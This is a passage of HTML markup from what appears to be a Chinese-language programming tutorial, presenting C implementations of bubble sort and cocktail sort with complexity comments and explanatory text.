class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-44\">44</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-1\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-3\"><span class=\"crayon-c\">// 分类 -------------- 内部比较排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-4\"><span class=\"crayon-c\">// 数据结构 ---------- 数组</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-5\"><span class=\"crayon-c\">// 最差时间复杂度 ---- O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-6\"><span class=\"crayon-c\">// 最优时间复杂度 ---- 如果能在内部循环第一次运行时,使用一个旗标来表示有无需要交换的可能,可以把最优时间复杂度降低到O(n)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-7\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-8\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(1)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-9\"><span class=\"crayon-c\">// 稳定性 ------------ 稳定</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-11\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-12\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-16\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-18\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BubbleSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-19\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">         </span><span class=\"crayon-c\">// 每次最大元素就像气泡一样\"浮\"到数组的最后</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 依次比较相邻的两个元素,使较大的那个向后移</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-24\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 如果条件改成A[i] &gt;= A[i + 1],则变为不稳定的排序算法</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-25\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-26\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-27\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-30\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-31\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-32\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-33\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 从小到大冒泡排序</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-36\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">BubbleSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"冒泡排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-40\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b59765328585-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b59765328585-44\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.1863 seconds] -->\r\n<p>上述代码对序列{ 6, 5, 3, 1, 8, 7, 2, 4 }进行冒泡排序的实现过程如下</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fr773jilosg208c050787.gif\" width=\"300\" height=\"180\"></p>\n<p>使用冒泡排序为一列数字进行排序的过程如右图所示：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fr773kcg1fg207p0751h7.gif\" width=\"277\" height=\"257\"></p>\n<p>尽管冒泡排序是最容易了解和实现的排序算法之一，但它对于少数元素之外的数列排序是很没有效率的。</p>\n<p>冒泡排序的改进：<strong>鸡尾酒排序</strong></p>\n<p>鸡尾酒排序，也叫<strong>定向冒泡排序</strong>，是冒泡排序的一种改进。此算法与冒泡排序的不同处在于<strong>从低到高然后从高到低</strong>，而冒泡排序则仅从低到高去比较序列里的每个元素。他可以得到比冒泡排序稍微好一点的效能。</p>\n<p>鸡尾酒排序的代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ad567a1b66676694737\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;stdio.h&gt;\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(n^2)\r\n// 最优时间复杂度 ---- 如果序列在一开始已经大部分排序过的话,会接近O(n)\r\n// 平均时间复杂度 ---- O(n^2)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 稳定\r\n\r\nvoid Swap(int A[], int i, int j)\r\n{\r\n    int temp = A[i];\r\n    A[i] = A[j];\r\n    A[j] = temp;\r\n}\r\n\r\nvoid CocktailSort(int A[], int n)\r\n{\r\n    int left = 0;                            // 初始化边界\r\n    int right = n - 1;\r\n    while (left &lt; right)\r\n    {\r\n        for (int i = left; i &lt; right; i++)   // 前半轮,将最大元素放到后面\r\n        {\r\n            if (A[i] &gt; A[i + 1])\r\n            {\r\n                Swap(A, i, i + 1);\r\n            }\r\n        }\r\n        right--;\r\n        for (int i = right; i &gt; left; i--)   // 后半轮,将最小元素放到前面\r\n        {\r\n            if (A[i - 1] &gt; A[i])\r\n            {\r\n                Swap(A, i - 1, i);\r\n            }\r\n        }\r\n        left++;\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 6, 5, 3, 1, 8, 7, 2, 4 };   // 从小到大定向冒泡排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    CocktailSort(A, n);\r\n    printf(\"鸡尾酒排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b66676694737-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b66676694737-55\">55</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-1\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-3\"><span class=\"crayon-c\">// 分类 -------------- 内部比较排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-4\"><span class=\"crayon-c\">// 数据结构 ---------- 数组</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-5\"><span class=\"crayon-c\">// 最差时间复杂度 ---- O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-6\"><span class=\"crayon-c\">// 最优时间复杂度 ---- 如果序列在一开始已经大部分排序过的话,会接近O(n)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-7\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-8\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(1)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-9\"><span class=\"crayon-c\">// 稳定性 ------------ 稳定</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b66676694737-11\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b66676694737-12\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" 